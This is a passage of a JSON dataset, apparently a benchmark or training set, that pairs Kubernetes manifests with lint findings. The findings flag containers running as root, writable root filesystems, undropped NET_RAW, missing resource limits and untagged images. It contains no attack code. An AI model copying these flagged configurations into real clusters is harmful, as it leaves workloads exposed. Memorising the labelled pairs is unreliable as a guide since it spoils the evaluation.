    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: check-acr-sync\n  namespace: monitoring\n  labels:\n    app: check-acr-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: check-acr-sync\n          image: hmctspublic.azurecr.io/check-acr-sync:dbbbwb\n          imagePullPolicy: IfNotPresent\n          resources:\n            requests:\n              memory: 64Mi\n              cpu: 250m\n            limits:\n              memory: 256Mi\n              cpu: 500m\n          env:\n          - name: SLACK_WEBHOOK\n            valueFrom:\n              secretKeyRef:\n                name: monitoring-values\n                key: slack-webhook\n          - name: SLACK_ICON\n            value: flux\n          - name: ACR_MAX_RESULTS\n            value: '3000'\n          - name: ACR_SYNC_DEBUG\n            value: 'true'\n          envFrom:\n          - secretRef:\n              name: acr-sync\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"check-acr-sync\" does not have a read-only root file system"
  },
  {
    "id": "2990",
    "manifest_path": "data/manifests/the_stack_sample/sample_0865.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: check-acr-sync\n  namespace: monitoring\n  labels:\n    app: check-acr-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: check-acr-sync\n          image: hmctspublic.azurecr.io/check-acr-sync:dbbbwb\n          imagePullPolicy: IfNotPresent\n          resources:\n            requests:\n              memory: 64Mi\n              cpu: 250m\n            limits:\n              memory: 256Mi\n              cpu: 500m\n          env:\n          - name: SLACK_WEBHOOK\n            valueFrom:\n              secretKeyRef:\n                name: monitoring-values\n                key: slack-webhook\n          - name: SLACK_ICON\n            value: flux\n          - name: ACR_MAX_RESULTS\n            value: '3000'\n          - name: ACR_SYNC_DEBUG\n            value: 'true'\n          envFrom:\n          - secretRef:\n              name: acr-sync\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"check-acr-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "2991",
    "manifest_path": "data/manifests/the_stack_sample/sample_0866.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fortunes\n  labels:\n    app: fortunes\nspec:\n  containers:\n  - name: fortunes\n    image: localhost:5000/fortunes\n    imagePullPolicy: Always\n    ports:\n    - name: app\n      containerPort: 3000\n    env:\n    - name: REDIS_HOST\n      value: redis-master\n    - name: REDIS_PORT\n      value: '6379'\n    - name: REDIS_PWD\n      value: none\n    - name: FORTUNES_TARGET_TOPIC\n      value: fc_fortunes_out\n    - name: FORTUNES_SOURCE_TOPIC\n      value: fc_fortunes_in\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"fortunes\" is using an invalid container image, \"localhost:5000/fortunes\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2992",
    "manifest_path": "data/manifests/the_stack_sample/sample_0866.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fortunes\n  labels:\n    app: fortunes\nspec:\n  containers:\n  - name: fortunes\n    image: localhost:5000/fortunes\n    imagePullPolicy: Always\n    ports:\n    - name: app\n      containerPort: 3000\n    env:\n    - name: REDIS_HOST\n      value: redis-master\n    - name: REDIS_PORT\n      value: '6379'\n    - name: REDIS_PWD\n      value: none\n    - name: FORTUNES_TARGET_TOPIC\n      value: fc_fortunes_out\n    - name: FORTUNES_SOURCE_TOPIC\n      value: fc_fortunes_in\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fortunes\" does not have a read-only root file system"
  },
  {
    "id": "2993",
    "manifest_path": "data/manifests/the_stack_sample/sample_0866.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fortunes\n  labels:\n    app: fortunes\nspec:\n  containers:\n  - name: fortunes\n    image: localhost:5000/fortunes\n    imagePullPolicy: Always\n    ports:\n    - name: app\n      containerPort: 3000\n    env:\n    - name: REDIS_HOST\n      value: redis-master\n    - name: REDIS_PORT\n      value: '6379'\n    - name: REDIS_PWD\n      value: none\n    - name: FORTUNES_TARGET_TOPIC\n      value: fc_fortunes_out\n    - name: FORTUNES_SOURCE_TOPIC\n      value: fc_fortunes_in\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fortunes\" is not set to runAsNonRoot"
  },
  {
    "id": "2994",
    "manifest_path": "data/manifests/the_stack_sample/sample_0866.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fortunes\n  labels:\n    app: fortunes\nspec:\n  containers:\n  - name: fortunes\n    image: localhost:5000/fortunes\n    imagePullPolicy: Always\n    ports:\n    - name: app\n      containerPort: 3000\n    env:\n    - name: REDIS_HOST\n      value: redis-master\n    - name: REDIS_PORT\n      value: '6379'\n    - name: REDIS_PWD\n      value: none\n    - name: FORTUNES_TARGET_TOPIC\n      value: fc_fortunes_out\n    - name: FORTUNES_SOURCE_TOPIC\n      value: fc_fortunes_in\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fortunes\" has cpu request 0"
  },
  {
    "id": "2995",
    "manifest_path": "data/manifests/the_stack_sample/sample_0866.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fortunes\n  labels:\n    app: fortunes\nspec:\n  containers:\n  - name: fortunes\n    image: localhost:5000/fortunes\n    imagePullPolicy: Always\n    ports:\n    - name: app\n      containerPort: 3000\n    env:\n    - name: REDIS_HOST\n      value: redis-master\n    - name: REDIS_PORT\n      value: '6379'\n    - name: REDIS_PWD\n      value: none\n    - name: FORTUNES_TARGET_TOPIC\n      value: fc_fortunes_out\n    - name: FORTUNES_SOURCE_TOPIC\n      value: fc_fortunes_in\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fortunes\" has memory limit 0"
  },
  {
    "id": "2996",
    "manifest_path": "data/manifests/the_stack_sample/sample_0867.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: es-client\n  namespace: es-cluster\n  labels:\n    component: elasticsearch\n    role: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: elasticsearch\n        role: client\n    spec:\n      serviceAccount: elasticsearch\n      containers:\n      - name: es-client\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        image: quay.io/pires/docker-elasticsearch-kubernetes:1.7.1-4\n        env:\n        - name: KUBERNETES_CA_CERTIFICATE_FILE\n          value: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CLUSTER_NAME\n          value: madcore_es\n        - name: NODE_MASTER\n          value: 'false'\n        - name: NODE_DATA\n          value: 'false'\n        - name: HTTP_ENABLE\n          value: 'true'\n        ports:\n        - containerPort: 9200\n          name: http\n          protocol: TCP\n        - containerPort: 9300\n          name: transport\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /data\n          name: storage\n      volumes:\n      - name: storage\n        emptyDir: {}\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (elasticsearch), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "2997",
    "manifest_path": "data/manifests/the_stack_sample/sample_0867.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: es-client\n  namespace: es-cluster\n  labels:\n    component: elasticsearch\n    role: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: elasticsearch\n        role: client\n    spec:\n      serviceAccount: elasticsearch\n      containers:\n      - name: es-client\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        image: quay.io/pires/docker-elasticsearch-kubernetes:1.7.1-4\n        env:\n        - name: KUBERNETES_CA_CERTIFICATE_FILE\n          value: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CLUSTER_NAME\n          value: madcore_es\n        - name: NODE_MASTER\n          value: 'false'\n        - name: NODE_DATA\n          value: 'false'\n        - name: HTTP_ENABLE\n          value: 'true'\n        ports:\n        - containerPort: 9200\n          name: http\n          protocol: TCP\n        - containerPort: 9300\n          name: transport\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /data\n          name: storage\n      volumes:\n      - name: storage\n        emptyDir: {}\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"es-client\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "2998",
    "manifest_path": "data/manifests/the_stack_sample/sample_0867.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: es-client\n  namespace: es-cluster\n  labels:\n    component: elasticsearch\n    role: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: elasticsearch\n        role: client\n    spec:\n      serviceAccount: elasticsearch\n      containers:\n      - name: es-client\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        image: quay.io/pires/docker-elasticsearch-kubernetes:1.7.1-4\n        env:\n        - name: KUBERNETES_CA_CERTIFICATE_FILE\n          value: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CLUSTER_NAME\n          value: madcore_es\n        - name: NODE_MASTER\n          value: 'false'\n        - name: NODE_DATA\n          value: 'false'\n        - name: HTTP_ENABLE\n          value: 'true'\n        ports:\n        - containerPort: 9200\n          name: http\n          protocol: TCP\n        - containerPort: 9300\n          name: transport\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /data\n          name: storage\n      volumes:\n      - name: storage\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"es-client\" does not have a read-only root file system"
  },
  {
    "id": "2999",
    "manifest_path": "data/manifests/the_stack_sample/sample_0867.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: es-client\n  namespace: es-cluster\n  labels:\n    component: elasticsearch\n    role: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: elasticsearch\n        role: client\n    spec:\n      serviceAccount: elasticsearch\n      containers:\n      - name: es-client\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        image: quay.io/pires/docker-elasticsearch-kubernetes:1.7.1-4\n        env:\n        - name: KUBERNETES_CA_CERTIFICATE_FILE\n          value: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CLUSTER_NAME\n          value: madcore_es\n        - name: NODE_MASTER\n          value: 'false'\n        - name: NODE_DATA\n          value: 'false'\n        - name: HTTP_ENABLE\n          value: 'true'\n        ports:\n        - containerPort: 9200\n          name: http\n          protocol: TCP\n        - containerPort: 9300\n          name: transport\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /data\n          name: storage\n      volumes:\n      - name: storage\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"elasticsearch\" not found"
  },
  {
    "id": "3000",
    "manifest_path": "data/manifests/the_stack_sample/sample_0867.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: es-client\n  namespace: es-cluster\n  labels:\n    component: elasticsearch\n    role: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: elasticsearch\n        role: client\n    spec:\n      serviceAccount: elasticsearch\n      containers:\n      - name: es-client\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        image: quay.io/pires/docker-elasticsearch-kubernetes:1.7.1-4\n        env:\n        - name: KUBERNETES_CA_CERTIFICATE_FILE\n          value: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CLUSTER_NAME\n          value: madcore_es\n        - name: NODE_MASTER\n          value: 'false'\n        - name: NODE_DATA\n          value: 'false'\n        - name: HTTP_ENABLE\n          value: 'true'\n        ports:\n        - containerPort: 9200\n          name: http\n          protocol: TCP\n        - containerPort: 9300\n          name: transport\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /data\n          name: storage\n      volumes:\n      - name: storage\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"es-client\" is not set to runAsNonRoot"
  },
  {
    "id": "3001",
    "manifest_path": "data/manifests/the_stack_sample/sample_0867.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: es-client\n  namespace: es-cluster\n  labels:\n    component: elasticsearch\n    role: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: elasticsearch\n        role: client\n    spec:\n      serviceAccount: elasticsearch\n      containers:\n      - name: es-client\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        image: quay.io/pires/docker-elasticsearch-kubernetes:1.7.1-4\n        env:\n        - name: KUBERNETES_CA_CERTIFICATE_FILE\n          value: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CLUSTER_NAME\n          value: madcore_es\n        - name: NODE_MASTER\n          value: 'false'\n        - name: NODE_DATA\n          value: 'false'\n        - name: HTTP_ENABLE\n          value: 'true'\n        ports:\n        - containerPort: 9200\n          name: http\n          protocol: TCP\n        - containerPort: 9300\n          name: transport\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /data\n          name: storage\n      volumes:\n      - name: storage\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"es-client\" has cpu request 0"
  },
  {
    "id": "3002",
    "manifest_path": "data/manifests/the_stack_sample/sample_0867.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: es-client\n  namespace: es-cluster\n  labels:\n    component: elasticsearch\n    role: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: elasticsearch\n        role: client\n    spec:\n      serviceAccount: elasticsearch\n      containers:\n      - name: es-client\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        image: quay.io/pires/docker-elasticsearch-kubernetes:1.7.1-4\n        env:\n        - name: KUBERNETES_CA_CERTIFICATE_FILE\n          value: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CLUSTER_NAME\n          value: madcore_es\n        - name: NODE_MASTER\n          value: 'false'\n        - name: NODE_DATA\n          value: 'false'\n        - name: HTTP_ENABLE\n          value: 'true'\n        ports:\n        - containerPort: 9200\n          name: http\n          protocol: TCP\n        - containerPort: 9300\n          name: transport\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /data\n          name: storage\n      volumes:\n      - name: storage\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"es-client\" has memory limit 0"
  },
  {
    "id": "3003",
    "manifest_path": "data/manifests/the_stack_sample/sample_0870.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\nspec:\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      name: mysql\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - name: mysql\n        image: mysql:5.7\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            configMapKeyRef:\n              name: mysql-config\n              key: MYSQL_ROOT_PASSWORD\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql\" does not have a read-only root file system"
  },
  {
    "id": "3004",
    "manifest_path": "data/manifests/the_stack_sample/sample_0870.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\nspec:\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      name: mysql\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - name: mysql\n        image: mysql:5.7\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            configMapKeyRef:\n              name: mysql-config\n              key: MYSQL_ROOT_PASSWORD\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql\" is not set to runAsNonRoot"
  },
  {
    "id": "3005",
    "manifest_path": "data/manifests/the_stack_sample/sample_0870.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\nspec:\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      name: mysql\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - name: mysql\n        image: mysql:5.7\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            configMapKeyRef:\n              name: mysql-config\n              key: MYSQL_ROOT_PASSWORD\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql\" has cpu request 0"
  },
  {
    "id": "3006",
    "manifest_path": "data/manifests/the_stack_sample/sample_0870.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\nspec:\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      name: mysql\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - name: mysql\n        image: mysql:5.7\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            configMapKeyRef:\n              name: mysql-config\n              key: MYSQL_ROOT_PASSWORD\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql\" has memory limit 0"
  },
  {
    "id": "3007",
    "manifest_path": "data/manifests/the_stack_sample/sample_0872.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bandicoot-prod\n  labels:\n    app: bandicoot\n    version: 1.0.0\n    env: prod\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: bandicoot\n  template:\n    metadata:\n      labels:\n        app: bandicoot\n    spec:\n      containers:\n      - image: gcr.io/k8s-vr-2021/kuard-amd64:blue\n        name: bandicoot-prod\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8080\n          periodSeconds: 2\n          initialDelaySeconds: 0\n          failureThreshold: 3\n          successThreshold: 1\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3008",
    "manifest_path": "data/manifests/the_stack_sample/sample_0872.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bandicoot-prod\n  labels:\n    app: bandicoot\n    version: 1.0.0\n    env: prod\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: bandicoot\n  template:\n    metadata:\n      labels:\n        app: bandicoot\n    spec:\n      containers:\n      - image: gcr.io/k8s-vr-2021/kuard-amd64:blue\n        name: bandicoot-prod\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8080\n          periodSeconds: 2\n          initialDelaySeconds: 0\n          failureThreshold: 3\n          successThreshold: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"bandicoot-prod\" does not have a read-only root file system"
  },
  {
    "id": "3009",
    "manifest_path": "data/manifests/the_stack_sample/sample_0872.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bandicoot-prod\n  labels:\n    app: bandicoot\n    version: 1.0.0\n    env: prod\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: bandicoot\n  template:\n    metadata:\n      labels:\n        app: bandicoot\n    spec:\n      containers:\n      - image: gcr.io/k8s-vr-2021/kuard-amd64:blue\n        name: bandicoot-prod\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8080\n          periodSeconds: 2\n          initialDelaySeconds: 0\n          failureThreshold: 3\n          successThreshold: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"bandicoot-prod\" is not set to runAsNonRoot"
  },
  {
    "id": "3010",
    "manifest_path": "data/manifests/the_stack_sample/sample_0872.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bandicoot-prod\n  labels:\n    app: bandicoot\n    version: 1.0.0\n    env: prod\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: bandicoot\n  template:\n    metadata:\n      labels:\n        app: bandicoot\n    spec:\n      containers:\n      - image: gcr.io/k8s-vr-2021/kuard-amd64:blue\n        name: bandicoot-prod\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8080\n          periodSeconds: 2\n          initialDelaySeconds: 0\n          failureThreshold: 3\n          successThreshold: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"bandicoot-prod\" has cpu request 0"
  },
  {
    "id": "3011",
    "manifest_path": "data/manifests/the_stack_sample/sample_0872.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bandicoot-prod\n  labels:\n    app: bandicoot\n    version: 1.0.0\n    env: prod\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: bandicoot\n  template:\n    metadata:\n      labels:\n        app: bandicoot\n    spec:\n      containers:\n      - image: gcr.io/k8s-vr-2021/kuard-amd64:blue\n        name: bandicoot-prod\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8080\n          periodSeconds: 2\n          initialDelaySeconds: 0\n          failureThreshold: 3\n          successThreshold: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"bandicoot-prod\" has memory limit 0"
  },
  {
    "id": "3012",
    "manifest_path": "data/manifests/the_stack_sample/sample_0873.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-service\nspec:\n  containers:\n  - name: hello-service\n    image: skaffold-hello\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hello-service\" is using an invalid container image, \"skaffold-hello\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3013",
    "manifest_path": "data/manifests/the_stack_sample/sample_0873.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-service\nspec:\n  containers:\n  - name: hello-service\n    image: skaffold-hello\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello-service\" does not have a read-only root file system"
  },
  {
    "id": "3014",
    "manifest_path": "data/manifests/the_stack_sample/sample_0873.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-service\nspec:\n  containers:\n  - name: hello-service\n    image: skaffold-hello\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello-service\" is not set to runAsNonRoot"
  },
  {
    "id": "3015",
    "manifest_path": "data/manifests/the_stack_sample/sample_0873.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-service\nspec:\n  containers:\n  - name: hello-service\n    image: skaffold-hello\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello-service\" has cpu request 0"
  },
  {
    "id": "3016",
    "manifest_path": "data/manifests/the_stack_sample/sample_0873.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-service\nspec:\n  containers:\n  - name: hello-service\n    image: skaffold-hello\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello-service\" has memory limit 0"
  },
  {
    "id": "3017",
    "manifest_path": "data/manifests/the_stack_sample/sample_0875.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: some-other-pod\nspec:\n  containers:\n  - name: some-container\n    image: busybox\n    command:\n    - /bin/sh\n    - -c\n    - watch \"cat /etc/config/comics\"\n    volumeMounts:\n    - name: config-volume\n      mountPath: /etc/config\n  volumes:\n  - name: config-volume\n    configMap:\n      name: file-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"some-container\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3018",
    "manifest_path": "data/manifests/the_stack_sample/sample_0875.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: some-other-pod\nspec:\n  containers:\n  - name: some-container\n    image: busybox\n    command:\n    - /bin/sh\n    - -c\n    - watch \"cat /etc/config/comics\"\n    volumeMounts:\n    - name: config-volume\n      mountPath: /etc/config\n  volumes:\n  - name: config-volume\n    configMap:\n      name: file-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"some-container\" does not have a read-only root file system"
  },
  {
    "id": "3019",
    "manifest_path": "data/manifests/the_stack_sample/sample_0875.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: some-other-pod\nspec:\n  containers:\n  - name: some-container\n    image: busybox\n    command:\n    - /bin/sh\n    - -c\n    - watch \"cat /etc/config/comics\"\n    volumeMounts:\n    - name: config-volume\n      mountPath: /etc/config\n  volumes:\n  - name: config-volume\n    configMap:\n      name: file-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"some-container\" is not set to runAsNonRoot"
  },
  {
    "id": "3020",
    "manifest_path": "data/manifests/the_stack_sample/sample_0875.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: some-other-pod\nspec:\n  containers:\n  - name: some-container\n    image: busybox\n    command:\n    - /bin/sh\n    - -c\n    - watch \"cat /etc/config/comics\"\n    volumeMounts:\n    - name: config-volume\n      mountPath: /etc/config\n  volumes:\n  - name: config-volume\n    configMap:\n      name: file-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"some-container\" has cpu request 0"
  },
  {
    "id": "3021",
    "manifest_path": "data/manifests/the_stack_sample/sample_0875.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: some-other-pod\nspec:\n  containers:\n  - name: some-container\n    image: busybox\n    command:\n    - /bin/sh\n    - -c\n    - watch \"cat /etc/config/comics\"\n    volumeMounts:\n    - name: config-volume\n      mountPath: /etc/config\n  volumes:\n  - name: config-volume\n    configMap:\n      name: file-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"some-container\" has memory limit 0"
  },
  {
    "id": "3022",
    "manifest_path": "data/manifests/the_stack_sample/sample_0876.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: gdcapi-service\nspec:\n  selector:\n    app: gdcapi\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 80\n    name: http\n  - protocol: TCP\n    port: 443\n    targetPort: 443\n    name: https\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:gdcapi])"
  },
  {
    "id": "3023",
    "manifest_path": "data/manifests/the_stack_sample/sample_0877.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: hello-openshift\n  name: hello-openshift\nspec:\n  ports:\n  - port: 8080\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app: hello-openshift\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:hello-openshift])"
  },
  {
    "id": "3024",
    "manifest_path": "data/manifests/the_stack_sample/sample_0878.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.5.7\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 15344ed303d5710e2cd3a4efcdd4a3cd191aa324d9f6b90bca190762be07d2a7\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.5.7\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: osstap1989\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.7\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ 